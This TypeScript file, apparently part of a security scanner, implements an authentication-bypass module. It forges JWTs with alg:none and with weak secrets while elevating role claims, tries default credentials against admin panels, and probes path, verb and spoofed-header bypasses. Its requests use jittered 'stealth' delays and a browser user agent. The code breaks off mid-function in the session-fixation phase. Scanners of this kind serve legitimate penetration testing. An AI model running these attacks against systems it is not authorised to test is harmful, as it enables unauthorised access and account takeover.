// =============================================================================
// VulnHunter AI - Authentication Bypass Scanner Module
// =============================================================================
// Detects authentication bypass vulnerabilities including JWT attacks, session
// fixation, default credentials, path traversal auth bypass, HTTP verb
// tampering, and header-based bypasses.
// CWE-287 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 base)
// =============================================================================

import {
  type Finding,
  type Vulnerability,
  Severity,
  VulnerabilityCategory,
} from "@vulnhunter/core";
import { generateUUID } from "@vulnhunter/core";
import { sendRequest, type HttpResponse } from "@vulnhunter/core";
import { createLogger } from "@vulnhunter/core";
import { RateLimiter } from "@vulnhunter/core";

import type { ScanModule } from "./xss.js";

const log = createLogger("scanner:auth-bypass");

// ---------------------------------------------------------------------------
// JWT Weak Secrets (common/default secrets for brute-force)
// ---------------------------------------------------------------------------

const JWT_WEAK_SECRETS: string[] = [
  "secret",
  "password",
  "123456",
  "admin",
  "key",
  "jwt_secret",
  "changeme",
  "test",
  "default",
  "mysecret",
  "supersecret",
  "s3cret",
  "JWT_SECRET",
  "your-256-bit-secret",
  "your-secret-key",
  "my-secret-key",
  "my_secret",
  "HS256_SECRET",
  "token_secret",
  "signing_key",
  "app_secret",
  "application_secret",
  "qwerty",
  "passw0rd",
  "hunter2",
  "letmein",
  "welcome",
  "abc123",
  "12345678",
  "iloveyou",
  "master",
  "trustno1",
  "dragon",
  "football",
  "shadow",
  "monkey",
  "1234567890",
  "000000",
  "",
  " ",
  "null",
  "undefined",
  "true",
  "false",
];

// ---------------------------------------------------------------------------
// Default Credentials Database
// ---------------------------------------------------------------------------

interface DefaultCred {
  technology: string;
  paths: string[];
  credentials: Array<{ username: string; password: string }>;
  indicators: string[];
}

const DEFAULT_CREDS: DefaultCred[] = [
  {
    technology: "WordPress",
    paths: ["/wp-login.php", "/wp-admin/"],
    credentials: [
      { username: "admin", password: "admin" },
      { username: "admin", password: "password" },
      { username: "admin", password: "123456" },
      { username: "admin", password: "wordpress" },
    ],
    indicators: ["wp-login", "wordpress", "wp-content"],
  },
  {
    technology: "Joomla",
    paths: ["/administrator/"],
    credentials: [
      { username: "admin", password: "admin" },
      { username: "admin", password: "joomla" },
    ],
    indicators: ["joomla", "com_login"],
  },
  {
    technology: "Drupal",
    paths: ["/user/login", "/admin/"],
    credentials: [
      { username: "admin", password: "admin" },
      { username: "admin", password: "drupal" },
    ],
    indicators: ["drupal", "Drupal.settings"],
  },
  {
    technology: "phpMyAdmin",
    paths: ["/phpmyadmin/", "/pma/", "/phpMyAdmin/"],
    credentials: [
      { username: "root", password: "" },
      { username: "root", password: "root" },
      { username: "root", password: "password" },
      { username: "root", password: "toor" },
      { username: "admin", password: "admin" },
    ],
    indicators: ["phpmyadmin", "phpMyAdmin"],
  },
  {
    technology: "Tomcat Manager",
    paths: ["/manager/html", "/manager/status", "/host-manager/html"],
    credentials: [
      { username: "tomcat", password: "tomcat" },
      { username: "admin", password: "admin" },
      { username: "admin", password: "tomcat" },
      { username: "manager", password: "manager" },
      { username: "tomcat", password: "s3cret" },
      { username: "admin", password: "" },
    ],
    indicators: ["tomcat", "Apache Tomcat"],
  },
  {
    technology: "Jenkins",
    paths: ["/login", "/j_acegi_security_check"],
    credentials: [
      { username: "admin", password: "admin" },
      { username: "admin", password: "password" },
      { username: "admin", password: "jenkins" },
    ],
    indicators: ["jenkins", "hudson"],
  },
  {
    technology: "Grafana",
    paths: ["/login"],
    credentials: [
      { username: "admin", password: "admin" },
      { username: "admin", password: "grafana" },
    ],
    indicators: ["grafana"],
  },
  {
    technology: "Kibana/Elasticsearch",
    paths: ["/_login", "/_security"],
    credentials: [
      { username: "elastic", password: "changeme" },
      { username: "admin", password: "admin" },
    ],
    indicators: ["kibana", "elasticsearch"],
  },
  {
    technology: "RabbitMQ",
    paths: ["/api/overview", "/#/"],
    credentials: [
      { username: "guest", password: "guest" },
      { username: "admin", password: "admin" },
    ],
    indicators: ["rabbitmq"],
  },
  {
    technology: "MongoDB Express",
    paths: ["/"],
    credentials: [
      { username: "admin", password: "pass" },
      { username: "admin", password: "admin" },
    ],
    indicators: ["mongo-express", "MongoDB"],
  },
  {
    technology: "Adminer",
    paths: ["/adminer.php", "/adminer/"],
    credentials: [
      { username: "root", password: "" },
      { username: "root", password: "root" },
    ],
    indicators: ["adminer"],
  },
  {
    technology: "Spring Boot Actuator",
    paths: ["/actuator", "/actuator/env", "/actuator/health", "/actuator/info", "/manage/env"],
    credentials: [],
    indicators: ["spring", "actuator", "_links"],
  },
];

// ---------------------------------------------------------------------------
// Auth bypass path manipulation patterns
// ---------------------------------------------------------------------------

const PATH_BYPASS_PATTERNS: Array<{ description: string; transform: (path: string) => string }> = [
  { description: "Double URL encoding", transform: (p) => p.replace(/\//g, "%252F") },
  { description: "Path traversal", transform: (p) => `/..;${p}` },
  { description: "Trailing dot", transform: (p) => `${p}.` },
  { description: "Double slash", transform: (p) => p.replace(/^\//, "//") },
  { description: "Semicolon bypass", transform: (p) => `${p};` },
  { description: "Null byte", transform: (p) => `${p}%00` },
  { description: "URL encoding", transform: (p) => encodeURIComponent(p).replace(/%2F/g, "/") },
  { description: "Case variation", transform: (p) => p.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c).join("") },
  { description: "Tab injection", transform: (p) => p.replace(/\//, "/\t") },
  { description: "Backslash substitution", transform: (p) => p.replace(/\//g, "\\") },
  { description: "Dot segment bypass", transform: (p) => `/./` + p.slice(1) },
  { description: "Double dot bypass", transform: (p) => `/../` + p.slice(1) },
  { description: "JSON extension", transform: (p) => `${p}.json` },
  { description: "Trailing slash", transform: (p) => p.endsWith("/") ? p.slice(0, -1) : `${p}/` },
];

// ---------------------------------------------------------------------------
// Header-based bypass headers
// ---------------------------------------------------------------------------

const BYPASS_HEADERS: Array<{ name: string; value: string; description: string }> = [
  { name: "X-Forwarded-For", value: "127.0.0.1", description: "IP spoofing via X-Forwarded-For" },
  { name: "X-Forwarded-Host", value: "127.0.0.1", description: "Host spoofing via X-Forwarded-Host" },
  { name: "X-Original-URL", value: "/admin", description: "URL override via X-Original-URL" },
  { name: "X-Rewrite-URL", value: "/admin", description: "URL override via X-Rewrite-URL" },
  { name: "X-Custom-IP-Authorization", value: "127.0.0.1", description: "Custom IP auth header" },
  { name: "X-Real-IP", value: "127.0.0.1", description: "IP spoofing via X-Real-IP" },
  { name: "X-Remote-IP", value: "127.0.0.1", description: "IP spoofing via X-Remote-IP" },
  { name: "X-Client-IP", value: "127.0.0.1", description: "IP spoofing via X-Client-IP" },
  { name: "X-Remote-Addr", value: "127.0.0.1", description: "IP spoofing via X-Remote-Addr" },
  { name: "True-Client-IP", value: "127.0.0.1", description: "IP spoofing via True-Client-IP" },
  { name: "Cluster-Client-IP", value: "127.0.0.1", description: "IP spoofing via Cluster-Client-IP" },
  { name: "X-ProxyUser-Ip", value: "127.0.0.1", description: "IP spoofing via X-ProxyUser-Ip" },
  { name: "X-Originating-IP", value: "127.0.0.1", description: "IP spoofing via X-Originating-IP" },
  { name: "CF-Connecting-IP", value: "127.0.0.1", description: "Cloudflare IP spoofing" },
  { name: "X-Host", value: "127.0.0.1", description: "Host spoofing via X-Host" },
];

// ---------------------------------------------------------------------------
// Common protected paths to test bypass on
// ---------------------------------------------------------------------------

const PROTECTED_PATHS: string[] = [
  "/admin",
  "/admin/",
  "/administrator",
  "/dashboard",
  "/panel",
  "/console",
  "/manage",
  "/management",
  "/internal",
  "/settings",
  "/config",
  "/configuration",
  "/api/admin",
  "/api/internal",
  "/api/config",
  "/debug",
  "/status",
  "/health",
  "/metrics",
  "/monitoring",
  "/swagger",
  "/api-docs",
  "/graphql",
  "/graphiql",
];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function stealthDelay(baseMs: number): Promise<void> {
  const jitter = Math.floor(Math.random() * baseMs * 0.5);
  return new Promise((resolve) => setTimeout(resolve, baseMs + jitter));
}

/** Base64url encode (no padding) */
function base64urlEncode(data: string): string {
  return Buffer.from(data)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

/** Base64url decode */
function base64urlDecode(data: string): string {
  const padded = data + "=".repeat((4 - (data.length % 4)) % 4);
  return Buffer.from(
    padded.replace(/-/g, "+").replace(/_/g, "/"),
    "base64",
  ).toString("utf8");
}

/** Parse a JWT token into its parts */
function parseJwt(token: string): { header: Record<string, unknown>; payload: Record<string, unknown>; signature: string } | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  try {
    const header = JSON.parse(base64urlDecode(parts[0]));
    const payload = JSON.parse(base64urlDecode(parts[1]));
    return { header, payload, signature: parts[2] };
  } catch {
    return null;
  }
}

/** Create a JWT with "none" algorithm */
function createNoneJwt(payload: Record<string, unknown>): string {
  const header = { alg: "none", typ: "JWT" };
  const headerB64 = base64urlEncode(JSON.stringify(header));
  const payloadB64 = base64urlEncode(JSON.stringify(payload));
  return `${headerB64}.${payloadB64}.`;
}

/** Sign a JWT with HMAC-SHA256 */
async function signJwtHmac(payload: Record<string, unknown>, secret: string): Promise<string> {
  const header = { alg: "HS256", typ: "JWT" };
  const headerB64 = base64urlEncode(JSON.stringify(header));
  const payloadB64 = base64urlEncode(JSON.stringify(payload));
  const data = `${headerB64}.${payloadB64}`;

  // Use Web Crypto API for HMAC
  const { createHmac } = await import("crypto");
  const sig = createHmac("sha256", secret).update(data).digest();
  const sigB64 = sig
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
  return `${data}.${sigB64}`;
}

function isAuthRequired(resp: HttpResponse): boolean {
  return (
    resp.status === 401 ||
    resp.status === 403 ||
    resp.status === 302 ||
    resp.status === 307 ||
    resp.body.toLowerCase().includes("login") ||
    resp.body.toLowerCase().includes("sign in") ||
    resp.body.toLowerCase().includes("unauthorized") ||
    resp.body.toLowerCase().includes("forbidden") ||
    resp.body.toLowerCase().includes("access denied")
  );
}

function isAuthBypassed(originalResp: HttpResponse, bypassResp: HttpResponse): boolean {
  // Original was auth-blocked, bypass returns successful content
  if (
    isAuthRequired(originalResp) &&
    !isAuthRequired(bypassResp) &&
    bypassResp.status >= 200 &&
    bypassResp.status < 300 &&
    bypassResp.body.length > 100
  ) {
    return true;
  }
  return false;
}

function buildAuthBypassFinding(params: {
  target: string;
  endpoint: string;
  method: string;
  bypassType: string;
  technique: string;
  confidence: number;
  evidence: string;
  responseBody: string;
  responseStatus: number;
  severity: Severity;
}): Finding {
  const vulnId = generateUUID();
  const cvssScore =
    params.severity === Severity.Critical
      ? 9.8
      : params.severity === Severity.High
        ? 8.1
        : 6.5;

  const vulnerability: Vulnerability = {
    id: vulnId,
    title: `Authentication Bypass via ${params.bypassType}`,
    description:
      `An authentication bypass vulnerability was detected at ${params.endpoint}. ` +
      `Using the "${params.technique}" technique, it was possible to access protected ` +
      `resources without proper authentication. This allows an attacker to gain ` +
      `unauthorized access to sensitive functionality or data.`,
    severity: params.severity,
    category: VulnerabilityCategory.AuthBypass,
    cvssScore,
    cvssVector:
      params.severity === Severity.Critical
        ? "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    cweId: "CWE-287",
    target: params.target,
    endpoint: params.endpoint,
    evidence: {
      description: params.evidence,
      payload: params.technique,
      extra: { bypassType: params.bypassType, technique: params.technique },
    },
    request: {
      method: params.method,
      url: params.endpoint,
      headers: {},
    },
    response: {
      statusCode: params.responseStatus,
      headers: {},
      body: params.responseBody.slice(0, 2000),
      responseTimeMs: 0,
    },
    remediation:
      "1. Implement centralized authentication and authorization middleware.\n" +
      "2. Use strong JWT signing algorithms (RS256) and validate tokens rigorously.\n" +
      "3. Never trust client-supplied headers (X-Forwarded-For, X-Original-URL) for authorization.\n" +
      "4. Enforce consistent path normalization before authorization checks.\n" +
      "5. Change all default credentials before deploying to production.\n" +
      "6. Implement account lockout and rate limiting on authentication endpoints.\n" +
      "7. Use multi-factor authentication for privileged access.",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/",
      "https://portswigger.net/web-security/authentication",
      "https://cwe.mitre.org/data/definitions/287.html",
      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
    ],
    confirmed: params.confidence >= 80,
    falsePositive: false,
    discoveredAt: new Date().toISOString(),
  };

  return {
    vulnerability,
    module: `scanner:auth_bypass:${params.bypassType.toLowerCase().replace(/[- /]/g, "_")}`,
    confidence: params.confidence,
    timestamp: new Date().toISOString(),
    rawData: {
      bypassType: params.bypassType,
      technique: params.technique,
    },
  };
}

// ---------------------------------------------------------------------------
// AuthBypassScanner Class
// ---------------------------------------------------------------------------

export class AuthBypassScanner implements ScanModule {
  public readonly name = "auth-bypass";

  private rateLimiter: RateLimiter;
  private userAgent: string;

  constructor() {
    this.rateLimiter = new RateLimiter(5);
    this.userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
  }

  async *execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    log.info({ target }, "Starting auth bypass scan");

    const rateLimit = typeof options.rateLimit === "number" ? options.rateLimit : 5;
    this.rateLimiter = new RateLimiter(rateLimit);
    if (typeof options.userAgent === "string") {
      this.userAgent = options.userAgent;
    }

    // Phase 1: JWT attacks
    yield* this.scanJwtAttacks(target, options);

    // Phase 2: Default credentials
    yield* this.scanDefaultCredentials(target);

    // Phase 3: Path traversal auth bypass
    yield* this.scanPathBypass(target);

    // Phase 4: HTTP verb tampering
    yield* this.scanVerbTampering(target);

    // Phase 5: Header-based bypass
    yield* this.scanHeaderBypass(target);

    // Phase 6: Session fixation
    yield* this.scanSessionFixation(target);

    log.info({ target }, "Auth bypass scan complete");
  }

  // -------------------------------------------------------------------------
  // Phase 1: JWT attacks
  // -------------------------------------------------------------------------

  private async *scanJwtAttacks(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    // Look for JWT tokens in the page or use a provided token
    let jwtToken: string | null = null;

    if (typeof options.jwtToken === "string") {
      jwtToken = options.jwtToken;
    } else {
      // Fetch the page and look for JWT patterns
      await this.rateLimiter.acquire();
      try {
        const resp = await sendRequest({
          method: "GET",
          url: target,
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        // JWT pattern: 3 base64url parts separated by dots
        const jwtRegex = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
        const match = jwtRegex.exec(resp.body);
        if (match) {
          jwtToken = match[0];
        }

        // Also check response headers for JWT
        for (const headerValue of Object.values(resp.headers)) {
          const headerMatch = jwtRegex.exec(headerValue);
          if (headerMatch) {
            jwtToken = headerMatch[0];
            break;
          }
        }
      } catch {
        // Skip
      }
    }

    if (!jwtToken) return;

    const parsed = parseJwt(jwtToken);
    if (!parsed) return;

    log.info({ alg: parsed.header.alg }, "JWT token found, testing attacks");

    // Attack 1: "none" algorithm bypass
    const noneToken = createNoneJwt(parsed.payload);
    // Also try variations of "none"
    const noneVariants = [
      createNoneJwt(parsed.payload),
      (() => {
        const h = base64urlEncode(JSON.stringify({ alg: "None", typ: "JWT" }));
        const p = base64urlEncode(JSON.stringify(parsed.payload));
        return `${h}.${p}.`;
      })(),
      (() => {
        const h = base64urlEncode(JSON.stringify({ alg: "NONE", typ: "JWT" }));
        const p = base64urlEncode(JSON.stringify(parsed.payload));
        return `${h}.${p}.`;
      })(),
      (() => {
        const h = base64urlEncode(JSON.stringify({ alg: "nOnE", typ: "JWT" }));
        const p = base64urlEncode(JSON.stringify(parsed.payload));
        return `${h}.${p}.`;
      })(),
    ];

    for (const noneJwt of noneVariants) {
      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: target,
          headers: {
            "User-Agent": this.userAgent,
            Authorization: `Bearer ${noneJwt}`,
            Cookie: `token=${noneJwt}; jwt=${noneJwt}; session=${noneJwt}`,
            Accept: "application/json,text/html",
          },
        });

        if (!isAuthRequired(resp) && resp.status >= 200 && resp.status < 300) {
          yield buildAuthBypassFinding({
            target,
            endpoint: target,
            method: "GET",
            bypassType: "JWT None Algorithm",
            technique: `JWT with alg:none accepted. Token: ${noneJwt.slice(0, 50)}...`,
            confidence: 90,
            evidence:
              `The server accepted a JWT token with "alg":"none" and returned status ${resp.status}. ` +
              `This means the signature validation is bypassed entirely.`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.Critical,
          });
          break;
        }
      } catch {
        continue;
      }
    }

    // Attack 2: Weak secret brute force
    if (parsed.header.alg === "HS256" || parsed.header.alg === "HS384" || parsed.header.alg === "HS512") {
      // Elevate privileges in the payload
      const elevatedPayload = { ...parsed.payload };
      if ("role" in elevatedPayload) {
        elevatedPayload.role = "admin";
      }
      if ("admin" in elevatedPayload) {
        elevatedPayload.admin = true;
      }
      if ("is_admin" in elevatedPayload) {
        elevatedPayload.is_admin = true;
      }

      for (const secret of JWT_WEAK_SECRETS) {
        await this.rateLimiter.acquire();
        await stealthDelay(50);

        try {
          const forgedToken = await signJwtHmac(elevatedPayload, secret);

          const resp = await sendRequest({
            method: "GET",
            url: target,
            headers: {
              "User-Agent": this.userAgent,
              Authorization: `Bearer ${forgedToken}`,
              Accept: "application/json,text/html",
            },
          });

          if (!isAuthRequired(resp) && resp.status >= 200 && resp.status < 300) {
            yield buildAuthBypassFinding({
              target,
              endpoint: target,
              method: "GET",
              bypassType: "JWT Weak Secret",
              technique: `JWT signed with weak secret "${secret}" was accepted`,
              confidence: 95,
              evidence:
                `The JWT is signed with a weak/guessable secret: "${secret}". ` +
                `An attacker can forge arbitrary tokens to impersonate any user.`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.Critical,
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }

    // Attack 3: Algorithm confusion (RS256 -> HS256)
    if (parsed.header.alg === "RS256" || parsed.header.alg === "RS384" || parsed.header.alg === "RS512") {
      // In a real attack, the public key would be used as the HMAC secret
      // We can only detect this if we have the public key; flag as informational
      const vulnId = generateUUID();
      const vulnerability: Vulnerability = {
        id: vulnId,
        title: "JWT Algorithm Confusion Risk (RSA-based signing)",
        description:
          `The application uses ${parsed.header.alg} for JWT signing. If the server does not ` +
          `explicitly validate the algorithm and an attacker obtains the public key ` +
          `(often available at /jwks.json or /.well-known/jwks.json), they could forge ` +
          `tokens using algorithm confusion (signing with HS256 using the public key as the HMAC secret).`,
        severity: Severity.Low,
        category: VulnerabilityCategory.AuthBypass,
        cvssScore: 3.7,
        cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        cweId: "CWE-287",
        target,
        endpoint: target,
        evidence: {
          description: `JWT uses ${parsed.header.alg} algorithm. Check for algorithm confusion vulnerability.`,
          extra: { algorithm: parsed.header.alg, headerKid: parsed.header.kid },
        },
        remediation:
          "1. Explicitly validate the JWT algorithm on the server side.\n" +
          "2. Use a library that does not allow algorithm switching.\n" +
          "3. Consider using asymmetric algorithms (RS256/ES256) with proper key management.",
        references: [
          "https://portswigger.net/web-security/jwt/algorithm-confusion",
          "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        ],
        confirmed: false,
        falsePositive: false,
        discoveredAt: new Date().toISOString(),
      };

      yield {
        vulnerability,
        module: "scanner:auth_bypass:jwt_algorithm_confusion",
        confidence: 40,
        timestamp: new Date().toISOString(),
        rawData: { header: parsed.header },
      };
    }
  }

  // -------------------------------------------------------------------------
  // Phase 2: Default credentials
  // -------------------------------------------------------------------------

  private async *scanDefaultCredentials(
    target: string,
  ): AsyncGenerator<Finding> {
    // Detect technologies first
    await this.rateLimiter.acquire();
    let pageResp: HttpResponse;
    try {
      pageResp = await sendRequest({
        method: "GET",
        url: target,
        headers: { "User-Agent": this.userAgent, Accept: "text/html" },
      });
    } catch {
      return;
    }

    const detectedTech: DefaultCred[] = [];
    for (const cred of DEFAULT_CREDS) {
      for (const indicator of cred.indicators) {
        if (pageResp.body.toLowerCase().includes(indicator.toLowerCase())) {
          detectedTech.push(cred);
          break;
        }
      }
    }

    // Also probe paths for technologies not detected in the main page
    for (const cred of DEFAULT_CREDS) {
      if (detectedTech.includes(cred)) continue;

      for (const path of cred.paths) {
        const checkUrl = new URL(path, target).toString();
        await this.rateLimiter.acquire();
        await stealthDelay(100);

        try {
          const resp = await sendRequest({
            method: "GET",
            url: checkUrl,
            headers: { "User-Agent": this.userAgent, Accept: "text/html" },
          });

          if (resp.status === 200) {
            for (const indicator of cred.indicators) {
              if (resp.body.toLowerCase().includes(indicator.toLowerCase())) {
                detectedTech.push(cred);
                break;
              }
            }
          }

          // Spring Boot Actuator: no auth needed, endpoints exposed
          if (cred.technology === "Spring Boot Actuator" && resp.status === 200 && cred.credentials.length === 0) {
            if (resp.body.includes("_links") || resp.body.includes("status")) {
              yield buildAuthBypassFinding({
                target,
                endpoint: checkUrl,
                method: "GET",
                bypassType: "Exposed Management Interface",
                technique: `Spring Boot Actuator endpoints exposed without authentication at ${path}`,
                confidence: 85,
                evidence:
                  `Spring Boot Actuator endpoint at ${checkUrl} is accessible without authentication. ` +
                  `This may expose sensitive configuration, environment variables, and health data.`,
                responseBody: resp.body,
                responseStatus: resp.status,
                severity: Severity.High,
              });
            }
          }
        } catch {
          continue;
        }
      }
    }

    // Test default credentials for detected technologies
    for (const tech of detectedTech) {
      for (const cred of tech.credentials) {
        for (const path of tech.paths) {
          const loginUrl = new URL(path, target).toString();
          await this.rateLimiter.acquire();
          await stealthDelay(300);

          try {
            // Try Basic auth
            const basicAuth = Buffer.from(
              `${cred.username}:${cred.password}`,
            ).toString("base64");
            const resp = await sendRequest({
              method: "GET",
              url: loginUrl,
              headers: {
                "User-Agent": this.userAgent,
                Authorization: `Basic ${basicAuth}`,
                Accept: "text/html,application/json",
              },
            });

            if (
              resp.status === 200 &&
              !isAuthRequired(resp) &&
              resp.body.length > 200
            ) {
              yield buildAuthBypassFinding({
                target,
                endpoint: loginUrl,
                method: "GET",
                bypassType: "Default Credentials",
                technique: `${tech.technology} default credentials: ${cred.username}:${cred.password}`,
                confidence: 95,
                evidence:
                  `Default credentials for ${tech.technology} were accepted. ` +
                  `Username: "${cred.username}", Password: "${cred.password}". ` +
                  `The server returned HTTP ${resp.status} with ${resp.body.length} bytes of content.`,
                responseBody: resp.body,
                responseStatus: resp.status,
                severity: Severity.Critical,
              });
              break; // Found working creds for this tech
            }

            // Try form-based login
            const formResp = await sendRequest({
              method: "POST",
              url: loginUrl,
              headers: {
                "User-Agent": this.userAgent,
                "Content-Type": "application/x-www-form-urlencoded",
                Accept: "text/html",
              },
              body: `username=${encodeURIComponent(cred.username)}&password=${encodeURIComponent(cred.password)}`,
            });

            // Successful login often returns a redirect (302/303) or 200 with dashboard content
            if (
              (formResp.status === 302 || formResp.status === 303) &&
              !formResp.body.toLowerCase().includes("invalid") &&
              !formResp.body.toLowerCase().includes("incorrect")
            ) {
              yield buildAuthBypassFinding({
                target,
                endpoint: loginUrl,
                method: "POST",
                bypassType: "Default Credentials",
                technique: `${tech.technology} default credentials: ${cred.username}:${cred.password}`,
                confidence: 85,
                evidence:
                  `Login form accepted default credentials for ${tech.technology}. ` +
                  `Username: "${cred.username}", Password: "${cred.password}". ` +
                  `Server redirected to authenticated area (HTTP ${formResp.status}).`,
                responseBody: formResp.body,
                responseStatus: formResp.status,
                severity: Severity.Critical,
              });
              break;
            }
          } catch {
            continue;
          }
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 3: Path traversal auth bypass
  // -------------------------------------------------------------------------

  private async *scanPathBypass(target: string): AsyncGenerator<Finding> {
    const baseUrl = new URL(target).origin;

    for (const protectedPath of PROTECTED_PATHS) {
      // First check if the path requires auth
      const normalUrl = `${baseUrl}${protectedPath}`;
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      let normalResp: HttpResponse;
      try {
        normalResp = await sendRequest({
          method: "GET",
          url: normalUrl,
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });
      } catch {
        continue;
      }

      if (!isAuthRequired(normalResp)) continue; // Not protected, skip

      // Try bypass patterns
      for (const bypassPattern of PATH_BYPASS_PATTERNS) {
        const bypassPath = bypassPattern.transform(protectedPath);
        const bypassUrl = `${baseUrl}${bypassPath}`;

        await this.rateLimiter.acquire();
        await stealthDelay(150);

        try {
          const resp = await sendRequest({
            method: "GET",
            url: bypassUrl,
            headers: { "User-Agent": this.userAgent, Accept: "text/html" },
          });

          if (isAuthBypassed(normalResp, resp)) {
            yield buildAuthBypassFinding({
              target,
              endpoint: bypassUrl,
              method: "GET",
              bypassType: "Path Manipulation",
              technique: `${bypassPattern.description}: ${protectedPath} -> ${bypassPath}`,
              confidence: 85,
              evidence:
                `Protected path "${protectedPath}" returned HTTP ${normalResp.status} ` +
                `but manipulated path "${bypassPath}" (${bypassPattern.description}) ` +
                `returned HTTP ${resp.status} with ${resp.body.length} bytes of content, ` +
                `bypassing authentication.`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.High,
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 4: HTTP verb tampering
  // -------------------------------------------------------------------------

  private async *scanVerbTampering(target: string): AsyncGenerator<Finding> {
    const baseUrl = new URL(target).origin;
    const alternativeMethods = ["HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "CONNECT"];

    for (const protectedPath of PROTECTED_PATHS.slice(0, 10)) {
      const normalUrl = `${baseUrl}${protectedPath}`;
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      let normalResp: HttpResponse;
      try {
        normalResp = await sendRequest({
          method: "GET",
          url: normalUrl,
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });
      } catch {
        continue;
      }

      if (!isAuthRequired(normalResp)) continue;

      for (const method of alternativeMethods) {
        await this.rateLimiter.acquire();
        await stealthDelay(100);

        try {
          const resp = await sendRequest({
            method,
            url: normalUrl,
            headers: {
              "User-Agent": this.userAgent,
              Accept: "text/html,application/json",
              "Content-Type": "application/json",
            },
            body: method !== "HEAD" && method !== "OPTIONS" && method !== "TRACE" && method !== "CONNECT" ? "{}" : undefined,
          });

          if (isAuthBypassed(normalResp, resp)) {
            yield buildAuthBypassFinding({
              target,
              endpoint: normalUrl,
              method,
              bypassType: "HTTP Verb Tampering",
              technique: `GET returned ${normalResp.status} but ${method} returned ${resp.status}`,
              confidence: 80,
              evidence:
                `Protected endpoint "${protectedPath}" blocked GET (HTTP ${normalResp.status}) ` +
                `but allowed ${method} (HTTP ${resp.status}) with ` +
                `${resp.body.length} bytes of content.`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.High,
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 5: Header-based bypass
  // -------------------------------------------------------------------------

  private async *scanHeaderBypass(target: string): AsyncGenerator<Finding> {
    const baseUrl = new URL(target).origin;

    for (const protectedPath of PROTECTED_PATHS.slice(0, 8)) {
      const normalUrl = `${baseUrl}${protectedPath}`;
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      let normalResp: HttpResponse;
      try {
        normalResp = await sendRequest({
          method: "GET",
          url: normalUrl,
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });
      } catch {
        continue;
      }

      if (!isAuthRequired(normalResp)) continue;

      for (const bypassHeader of BYPASS_HEADERS) {
        await this.rateLimiter.acquire();
        await stealthDelay(100);

        try {
          const headers: Record<string, string> = {
            "User-Agent": this.userAgent,
            Accept: "text/html",
            [bypassHeader.name]: bypassHeader.value,
          };

          // For X-Original-URL and X-Rewrite-URL, use root path as the request URL
          const requestUrl =
            bypassHeader.name === "X-Original-URL" ||
            bypassHeader.name === "X-Rewrite-URL"
              ? `${baseUrl}/`
              : normalUrl;

          if (
            bypassHeader.name === "X-Original-URL" ||
            bypassHeader.name === "X-Rewrite-URL"
          ) {
            headers[bypassHeader.name] = protectedPath;
          }

          const resp = await sendRequest({
            method: "GET",
            url: requestUrl,
            headers,
          });

          if (isAuthBypassed(normalResp, resp)) {
            yield buildAuthBypassFinding({
              target,
              endpoint: normalUrl,
              method: "GET",
              bypassType: "Header-based Bypass",
              technique: `${bypassHeader.description}: ${bypassHeader.name}: ${headers[bypassHeader.name]}`,
              confidence: 85,
              evidence:
                `Adding "${bypassHeader.name}: ${headers[bypassHeader.name]}" header ` +
                `bypassed authentication for "${protectedPath}". ` +
                `Normal response: HTTP ${normalResp.status}, ` +
                `Bypass response: HTTP ${resp.status} (${resp.body.length} bytes).`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.High,
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 6: Session fixation
  // -------------------------------------------------------------------------

  private async *scanSessionFixation(
    target: string,
  ): AsyncGenerator<Finding> {
    // Test if the application accepts a pre-set session token
    const fixedSessionValues = [
      "vulnhunter_test_session_12345",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    ];

    const commonSessionNames = [
      "PHPSESSID",
      "JSESSIONID",
      "ASP.NET_SessionId",
      "session",
      "sid",
      "connect.sid",
      "token",
      "session_id",
    ];

    for (const sessionName of commonSessionNames) {
      for (const fixedValue of fixedSessionValues) {
        await this.rateLimiter.acquire();
        await stealthDelay(200);

        try {
          // Send request with a fixed session cookie
